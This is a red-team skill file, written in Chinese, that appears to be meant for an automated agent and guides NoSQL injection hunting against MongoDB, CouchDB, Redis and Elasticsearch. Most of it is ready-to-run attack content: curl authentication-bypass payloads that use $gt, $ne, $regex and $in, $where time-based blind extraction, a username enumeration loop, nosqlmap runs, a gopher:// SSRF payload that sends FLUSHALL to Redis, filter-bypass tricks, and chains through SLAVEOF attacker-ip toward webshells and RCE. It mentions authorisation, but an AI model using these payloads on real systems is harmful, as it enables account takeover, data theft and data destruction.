---
name: hunt-nosqli
description: 猎取 NoSQL 注入 —— MongoDB 运算符注入（$where、$regex、$gt、$ne）、CouchDB、Redis 命令注入、经 NoSQLi 的认证绕过、数据导出。适用于目标使用 MongoDB/Mongoose、CouchDB、Redis，或出现 NoSQL 错误消息时。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [nosql, injection, hunt, redteam]
  category: redteam
---

# HUNT-NOSQLI — NoSQL 注入

## When to Use

- 目标使用 MongoDB/Mongoose、CouchDB、Redis。
- 出现 NoSQL 错误消息。

## Prerequisites

- 针对目标的明确授权、目标边界和速率限制。
- 工具：`curl`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），在执行命令前立即取得明确确认。

## How to Run

```bash
# Set once per engagement; every step below uses these.
TARGET="example.com"   # or the engagement target
export OUTPUT_DIR="${OUTPUT_DIR:-./output}"

# Operator injection in JSON body
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Regex wildcard — match any username
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# ne (not equal) bypass
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'
```

## Procedure

以下各阶段即为操作流程。保持每次探测有界（`--max-time`），在 `OUTPUT_DIR` 下记录证据，并在 Pitfalls 中列出的停止条件处停止。

## 核心高价值目标

NoSQL 注入在绕过认证（严重）或泄露整个用户集合（高）时价值最高。

**最高价值链路：**
- **MongoDB 认证绕过** —— `{"username": {"$gt": ""}, "password": {"$gt": ""}}` 以集合中的第一个用户（通常是 admin）登录
- **$where JS 注入** —— 若启用 $where：盲注 → 数据外带
- **Redis 命令注入** —— 经 SSRF 或直接 TCP，SLAVEOF attacker-ip → 写入配置 → webshell
- **Elasticsearch 注入** —— _search 端点配合 Groovy 脚本注入（5.0 之前）→ RCE

---

## 攻击面信号

### URL 与参数模式
```
/api/users/login         POST with JSON body
/api/search?q=
/api/find?filter=
/api/query?where=
Any endpoint accepting JSON body with username/password
```

### 技术栈信号
| 信号 | 向量 |
|--------|--------|
| 响应中出现 MongoDB 错误消息 | 运算符注入 |
| JS 包中出现 mongoose / monk | ODM 模式 |
| X-Powered-By: Express | Node.js + MongoDB 常见技术栈 |
| CouchDB/_utils UI 暴露 | Futon/Fauxton 管理界面 |
| Redis 端口 6379 开放（经 SSRF） | CONFIG SET / SLAVEOF |
| Elasticsearch :9200 开放 | 脚本注入 |

---

## 分步猎取方法论

### 阶段 1 —— 认证绕过（MongoDB）
```bash
# Operator injection in JSON body
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Regex wildcard — match any username
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# ne (not equal) bypass
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# in array bypass
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

### 阶段 2 —— URL 参数注入
```bash
# Array notation (Express/PHP-style)
curl --max-time 30 --connect-timeout 10 "https://$TARGET/api/users?username[$gt]=&password[$gt]="
curl --max-time 30 --connect-timeout 10 "https://$TARGET/api/search?q[$regex]=.*&q[$options]=i"

# POST form data
curl --max-time 30 --connect-timeout 10 "https://$TARGET/api/login" \
  --data "username[$gt]=&password[$gt]="
```

### 阶段 3 —— $where 盲注（基于时间）
```bash
# Test if $where is enabled (time-based detection, 5s delay)
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'
# If response takes 5+ seconds → $where injection confirmed

# Blind data exfil (username starts with 'a'?)
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
```

### 阶段 4 —— 通过正则导出数据
```bash
# Enumerate usernames character by character
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/users \
    -H "Content-Type: application/json" \
    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
  echo "$c: $(echo $RESP | wc -c)"
done
```

### 阶段 5 —— 自动化
```bash
# nosqlmap
pip3 install nosqlmap
nosqlmap -u "https://$TARGET/api/login" --attack 1

# nosqlmap data extraction
nosqlmap -u "https://$TARGET/api/login" --attack 2
```

### 阶段 6 —— 经 SSRF 攻击 Redis
```bash
# If SSRF found, probe internal Redis via gopher://
curl --max-time 30 --connect-timeout 10 "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"

# CONFIG SET webshell (if Redis has write access to web root)
# Use SLAVEOF for OOB data exfil
```

---

## 绕过对照表

| 防御 | 绕过 |
|---------|--------|
| JSON.parse 拒绝对象 | 使用数组：`password[$ne]=x`（URL 参数） |
| 过滤 `$` | Unicode：`$gt` |
| 屏蔽运算符键 | 结构更深层的嵌套对象 |

---

## 链路对照表

| NoSQLi 发现 | 链接到 | 影响 |
|---------------|----------|--------|
| 认证绕过 | 管理面板访问 | 完全管理员控制 |
| 通过正则枚举用户 | 凭据填充 | 大规模账户接管 |
| 启用 $where | 数据库进程内的任意 JS | 数据外带或 DoS |
| 经 SSRF 攻击 Redis | CONFIG SET / SLAVEOF | Webshell 或数据外带 |

---

## 验证判定

✅ 认证绕过：使用无效凭据登录成功，并获得有效会话令牌
✅ 数据导出：返回了你不应有权访问的用户/文档
✅ 盲注：通过时间延迟确认（>4 秒且稳定一致）

**严重性：**
- 以管理员身份认证绕过：严重
- 用户集合导出：高
- 盲注（无有用的外带）：中

## Pitfalls
- **没有数据外带的 NoSQL 注入** —— 返回 true/false 的盲注 NoSQLi 更难利用。需要数据提取或认证绕过。
- **没有枚举证明的 $regex 注入** —— 若 `$regex` 可注入，应演示基于时间或基于布尔的数据提取。
- **MongoDB $where 注入** —— `$where` 会执行 JavaScript。这是影响最大的 NoSQL 注入变体。
- **运算符注入与值注入** —— 在值字段中注入 `{"$gt":""}` 与在查询结构中注入运算符是两种不同的攻击类型。

---

## Verification
- payload 必须相对于对照请求改变行为：认证绕过、额外文档或明显不同的错误。
- 仅当注入的运算符改变了结果集或认证状态时才算运算符注入，仅凭 200 不算。
- 请求、响应、UTC 时间戳和工具版本记录在 `${OUTPUT_DIR:-./output}` 下。

---

## 相关技能

- **`hunt-sqli`** —— 传统 SQL 注入与 NoSQL 互补；在同一参数上两者都要测试。链路原语：参数同时接受 SQL `' OR 1=1--` 和 NoSQL `{$gt:""}` —— 先测 SQL，再测 NoSQL 运算符注入。
- **`hunt-auth-bypass`** —— NoSQLi 登录绕过（`{\"$ne\":\"\"}`）是一种认证绕过原语，而非数据读取。链路原语：NoSQLi `$gt` 绕过 → 管理面板 → 链式扩展权限提升。
- **`hunt-ssrf`** —— 经 SSRF 攻击 Redis 是典型的 NoSQL 注入到 RCE 路径。链路原语：SSRF → `gopher://redis:6379/_CONFIG SET...` → 写 cron → RCE。
- **`hunt-rce`** —— MongoDB 中的 `$where` JavaScript 注入在数据库进程可访问 JS 引擎时可触达 `child_process`。链路原语：`$where` 配合 sleep(5000) 确认 → 通过 JS `this.password` 外带数据 → 破解管理员哈希。
- **`security-arsenal`** —— 取用 NoSQL payload 树：`$gt`、`$ne`、`$regex`、`$nin`、`$where`、`$exists` 运算符、MongoDB 认证绕过 JSON、PHP 数组注入 `param[$regex]=.*` 模式。
- **`triage-validation`** —— 应用 Pre-Severity Gate。只以集合中*第一个*用户（通常是测试/管理员账户）登录的 NoSQL 认证绕过属于严重；若无法定位特定受害者、只能以*随机*用户登录，则可能只有中危。
